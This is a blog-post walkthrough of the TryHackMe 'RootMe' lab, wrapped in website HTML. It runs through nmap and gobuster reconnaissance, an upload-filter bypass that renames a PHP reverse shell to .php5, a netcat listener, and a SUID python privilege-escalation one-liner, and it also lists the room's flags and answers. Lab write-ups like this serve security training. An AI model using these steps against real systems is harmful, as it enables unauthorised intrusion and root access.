@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>RootMe &gt;_ :: Security Blogs</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://secblogs.netlify.app/posts/rootme/rootme/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://secblogs.netlify.app/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://secblogs.netlify.app/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://secblogs.netlify.app/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="RootMe &gt;_">
+<meta property="og:description" content="This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation." />
+<meta property="og:url" content="https://secblogs.netlify.app/posts/rootme/rootme/" />
+<meta property="og:site_name" content="Security Blogs" />
+
+  
+    <meta property="og:image" content="https://secblogs.netlify.app/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-09-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    S3c-bl0gs and Writeups
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Posts</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Show more&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/showcase" >Showcase</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://secblogs.netlify.app/posts/rootme/rootme/">RootMe &gt;_</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-09-28</time><span class="post-author">sumit</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        
+<img src="../home.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"    />
+
+
+<h1 id="intro">Intro<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This RootMe challenge requires you to exploit a web server and find hidden directories and also get a reverse shell to find the flag through privilege escalation.</p>
+<blockquote>
+<p>Room Link: <a href="https://tryhackme.com/room/rrootme">https://tryhackme.com/room/rrootme</a></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>⚠️Tools used:</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&gt; Ping</td>
+</tr>
+<tr>
+<td>&gt; Nmap</td>
+</tr>
+<tr>
+<td>&gt; Netcat</td>
+</tr>
+<tr>
+<td>&gt; Gobuster</td>
+</tr>
+<tr>
+<td>&gt; Python</td>
+</tr>
+</tbody>
+</table>
+<h1 id="-task-1-deploy-the-machine"># Task 1 Deploy the machine<a href="#-task-1-deploy-the-machine" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Connect to TryHackMe network through openvpn and deploy the machine.
+Click on the <code>start machine</code> button.
+Wait for few second after this it will show an ip addr.<br>
+My ip: <code>10.10.156.27</code><br>
+In your case ip may be different.</p>
+<h1 id="-task-2-reconnaissance"># Task 2 Reconnaissance<a href="#-task-2-reconnaissance" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="ping-scan">ping scan<a href="#ping-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Check whether the host is reachable or not across the ip address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ping <span style="color:#ae81ff">10.10.156.27</span>
+</span></span><span style="display:flex;"><span>PING <span style="color:#ae81ff">10.10.156.27</span> (<span style="color:#ae81ff">10.10.156.27</span>) <span style="color:#ae81ff">56</span>(<span style="color:#ae81ff">84</span>) bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from <span style="color:#ae81ff">10.10.156.27</span><span style="color:#f92672">:</span> icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">263</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from <span style="color:#ae81ff">10.10.156.27</span><span style="color:#f92672">:</span> icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">232</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from <span style="color:#ae81ff">10.10.156.27</span><span style="color:#f92672">:</span> icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">297</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from <span style="color:#ae81ff">10.10.156.27</span><span style="color:#f92672">:</span> icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">286</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#f92672">^</span>C
+</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> <span style="color:#ae81ff">10.10.156.27</span> ping statistics <span style="color:#f92672">---</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span> packets transmitted, <span style="color:#ae81ff">4</span> received, <span style="color:#ae81ff">20</span><span style="color:#f92672">%</span> packet loss, time <span style="color:#ae81ff">4008</span>ms
+</span></span><span style="display:flex;"><span>rtt min<span style="color:#f92672">/</span>avg<span style="color:#f92672">/</span>max<span style="color:#f92672">/</span>mdev <span style="color:#f92672">=</span> <span style="color:#ae81ff">231.753</span><span style="color:#f92672">/</span><span style="color:#ae81ff">269.480</span><span style="color:#f92672">/</span><span style="color:#ae81ff">297.297</span><span style="color:#f92672">/</span><span style="color:#ae81ff">24.998</span> ms
+</span></span></code></pre></div><p>Host is reachable now go to the site, copy paste the ip into your address bar of your browser.</p>
+<p>Now view the page source:
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox" checked />
+    <label for="1">
+      <span class="collapsable-code__language">html</span>
+      <span class="collapsable-code__title">View page source</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;UTF-8&#34;&gt;
+    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;css/home.css&#34;&gt;
+    &lt;script src=&#34;js/maquina_de_escrever.js&#34;&gt;&lt;/script&gt;
+    &lt;title&gt;HackIT - Home&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&#34;main-div&#34;&gt;
+        &lt;p class=&#34;title&#34;&gt;root@rootme:~#&lt;/p&gt;
+        &lt;p class=&#34;description&#34;&gt;
+            Can you root me?
+        &lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;!--  --&gt;
+
+    &lt;script&gt;
+        const titulo = document.querySelector(&#39;.title&#39;);
+        typeWrite(titulo);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+  </div>
+
+
+We get nothing important here.
+Now do the nmap scan.</p>
+<h1 id="nmap-scan">nmap scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Run nmap scan to search which ports are open and much more. First create the nmap folder and Run the following command.<br>
+command:<code>mkdir nmap</code><br>
+command:<code>cd nmap</code><br>
+command:<code>nmap -sV -oN nmap/rootme 10.10.156.27</code>\</p>
+<p>command breakdown:</p>
+<ul>
+<li>-sV : Version Detection</li>
+<li>-oN : store the output into nmap folder</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Wed Sep 27 23:49:49 2023 as: nmap -sV -oN nmap/rootm\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">e 10.10.156.27
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.156.27</span>
+</span></span><span style="display:flex;"><span>Host is <span style="color:#a6e22e">up</span> (<span style="color:#ae81ff">0.37</span>s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp <span style="color:#a6e22e">ports</span> (conn<span style="color:#f92672">-</span>refused)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh     OpenSSH <span style="color:#ae81ff">7.6</span>p1 Ubuntu <span style="color:#ae81ff">4u</span>buntu0<span style="color:#ae81ff">.3</span> (Ubuntu Linux; protocol <span style="color:#ae81ff">2.</span>\
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http    Apache httpd <span style="color:#ae81ff">2.4.29</span> ((Ubuntu))
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nma\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">p.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># Nmap done at Thu Sep 28 00:03:21 2023 -- 1 IP address (1 host up) scanned in \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">811.92 seconds
+</span></span></span></code></pre></div><p>Port 22- ssh</p>
+<p>Here we are able to see that our SSH port is open. This port isn&rsquo;t too vulnerable unless we have found someones credentials. Se we will not mess with it.</p>
+<p>Port 80- http</p>
+<p>It is here were we find a webservice. Lets poke around and see if there is anyting interesting.</p>
+<h1 id="qna">QnA:<a href="#qna" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ol>
+<li>
+<p>Scan the machine, how many ports are open?<br>
+<code>ans: 2</code></p>
+</li>
+<li>
+<p>What version pf Apache is running?<br>
+<code>ans: 2.4.29</code></p>
+</li>
+<li>
+<p>What service is running on port 22?<br>
+<code>ans: ssh</code></p>
+</li>
+</ol>
+<h1 id="finding-hidden-directories">Finding hidden directories<a href="#finding-hidden-directories" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.
+command:<code>gobuster dir -u http://10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(sumit<span style="color:#960050;background-color:#1e0010">㉿</span>mr<span style="color:#f92672">-</span>nob0dy)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>ctf<span style="color:#f92672">/</span>tryhackme]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> gobuster dir <span style="color:#f92672">-</span>u http:<span style="color:#75715e">//10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3<span style="color:#ae81ff">.6</span>
+</span></span><span style="display:flex;"><span>by OJ <span style="color:#a6e22e">Reeves</span> (<span style="color:#960050;background-color:#1e0010">@</span>TheColonial) <span style="color:#f92672">&amp;</span> Christian <span style="color:#a6e22e">Mehlmauer</span> (<span style="color:#960050;background-color:#1e0010">@</span>firefart)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Url:                     http:<span style="color:#75715e">//10.10.156.27/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#f92672">+</span>] Method:                  GET
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Wordlist:                <span style="color:#f92672">/</span>home<span style="color:#75715e">//sumit/ctf/directory-list-2.3-medium.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#f92672">+</span>] Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] User Agent:              gobuster<span style="color:#f92672">/</span><span style="color:#ae81ff">3.6</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Timeout:                 <span style="color:#ae81ff">10</span>s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">uploads</span>              (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">314</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#75715e">//10.10.156.27/uploads/]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">/</span><span style="color:#a6e22e">css</span>                  (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">310</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#75715e">//10.10.156.27/css/]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">/</span><span style="color:#a6e22e">js</span>                   (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">309</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#75715e">//10.10.156.27/js/]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">/</span><span style="color:#a6e22e">panel</span>                (Status: <span style="color:#ae81ff">301</span>) [Size: <span style="color:#ae81ff">312</span>] [<span style="color:#f92672">--&gt;</span> http:<span style="color:#75715e">//10.10.156.27/panel/]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Progress: <span style="color:#ae81ff">8609</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">220561</span> (<span style="color:#ae81ff">3.90</span><span style="color:#f92672">%</span>)<span style="color:#f92672">^</span>C
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">!</span>] Keyboard interrupt detected, terminating.
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">8609</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">220561</span> (<span style="color:#ae81ff">3.90</span><span style="color:#f92672">%</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>We found some directories like uploads and panel.</p>
+<h1 id="qna-1">QnA:<a href="#qna-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ol start="4">
+<li>Find directories on the web server using the GoBuster tool.<br>
+<code>ans: no answer needed</code></li>
+<li>What is the hidden directory?<br>
+<code>ans: /panel/</code></li>
+</ol>
+<h1 id="-task-3-getting-a-shell"># Task 3 Getting a shell<a href="#-task-3-getting-a-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Try to reach <code>http://$IP/panel/</code>
+we have a section to upload a file, so we have a chance to get the reverse shell so try to upload reverse-shell-php file which is available on the internet. Change the ip address by your ip and change the port in the php file. Now upload the file.</p>
+
+<img src="../panel1.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>We get some error, we can&rsquo;t upload php file so we have to find another way to upload file.
+Now try to change the file extension from php to <code>php5</code> or <code>phtml</code> etc.<br>
+command:<code>mv php-reverse-shell.php php-reverse-shell.php5</code><br>
+Try to upload the file again.</p>
+
+<img src="../panel2.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Wooo file is successfully uploaded&hellip;<br>
+Now go to <code>http://$IP/uploads/</code></p>
+
+<img src="../uploads.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>file is uploaded.<br>
+now we use netcat tool to gain the access of reverse shell.</p>
+<h1 id="netcat">netcat<a href="#netcat" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Run the following command.<br>
+command:<code>nc -lvnp 4444</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(sumit<span style="color:#960050;background-color:#1e0010">㉿</span>mr<span style="color:#f92672">-</span>nob0dy)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>ctf<span style="color:#f92672">/</span>tryhackme<span style="color:#f92672">/</span>rootme]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> nc <span style="color:#f92672">-</span>lvnp <span style="color:#ae81ff">4444</span>               
+</span></span><span style="display:flex;"><span>listening on [any] <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to [<span style="color:#ae81ff">10.8.161.225</span>] <span style="color:#a6e22e">from</span> (UNKNOWN) [<span style="color:#ae81ff">10.10.156.27</span>] <span style="color:#ae81ff">38336</span>
+</span></span><span style="display:flex;"><span>Linux rootme <span style="color:#ae81ff">4.15.0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">112</span><span style="color:#f92672">-</span>generic <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">113</span><span style="color:#f92672">-</span>Ubuntu SMP Thu Jul <span style="color:#ae81ff">9</span> <span style="color:#ae81ff">23</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span> UTC <span style="color:#ae81ff">2020</span> x86_64 x86_64 x86_64 GNU<span style="color:#f92672">/</span>Linux
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">30</span> up  <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">31</span>,  <span style="color:#ae81ff">0</span> users,  load average: <span style="color:#ae81ff">0.00</span>, <span style="color:#ae81ff">0.00</span>, <span style="color:#ae81ff">0.00</span>
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN<span style="color:#960050;background-color:#1e0010">@</span>   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>(www<span style="color:#f92672">-</span>data) gid<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>(www<span style="color:#f92672">-</span>data) groups<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>(www<span style="color:#f92672">-</span>data)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh: <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> 
+</span></span></code></pre></div><p>We get the shell access, now gothrough the all files and folders. try to find user.txt run the following command.<br>
+command:<code>find -type f -name user.txt</code>\</p>
+
+<img src="../flag1.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>Run:<br>
+command:<code>cd var/www</code><br>
+command:<code>ls</code><br>
+command:<code>cat user.txt</code>\</p>
+<p>We got our first flag:
+<code>THM{y0u_g0t_a_sh3ll}</code></p>
+<h1 id="-task-4-privilege-escalation"># Task 4 Privilege escalation<a href="#-task-4-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now that we have a shell, let&rsquo;s escalate our privileges to root.<br>
+From hint run the following command to search a file with SUID permission and we got the file with the name python.<br>
+command:<code>find / -user root -perm /4000</code>\</p>
+<p>We have a shell but it is not stable. From hint do some research on GTFOBins, Google it. Search for python in gtfobins go the SUID section we got the command.</p>
+
+<img src="../gtfobin.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
+
+
+<p>command:<code>python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'</code><br>
+command:<code>cd root</code><br>
+command:<code>ls</code><br>
+command:<code>cat root.txt</code>\</p>
+<p>By running the above command we get the root access or a stable shell now try to access <code>root.txt</code> file.
+we got our 2nd flag&hellip;.
+flag:<code>THM{pr1v1l3g3_3sc4l4t10n}</code></p>
+<h1 id="qna-2">QnA:<a href="#qna-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ol>
+<li>
+<p>Search for files with SUID permission, which file is weird?<br>
+<code>ans: /usr/bin/python</code>\</p>
+</li>
+<li>
+<p>Find a form to escalate your privileges.<br>
+<code>ans: no answer needed</code></p>
+</li>
+<li>
+<p>root.txt
+<code>ans: THM{pr1v1l3g3_3sc4l4t10n}</code></p>
+</li>
+</ol>
+<h1 id="congrats-we-have-successfully-completed-the-room-hope-you-learnt-something-new">Congrats, we have successfully completed the room, hope you learnt something new&hellip;<a href="#congrats-we-have-successfully-completed-the-room-hope-you-learnt-something-new" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Thanks for the reading&hellip;</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://secblogs.netlify.app/posts/pickle-rick/pickle-rick/">
+                <span class="button__text">Pickle Rick</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Made with 💚 by <a href="https://sumit2011.github.io" target="_blank">Sumit</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
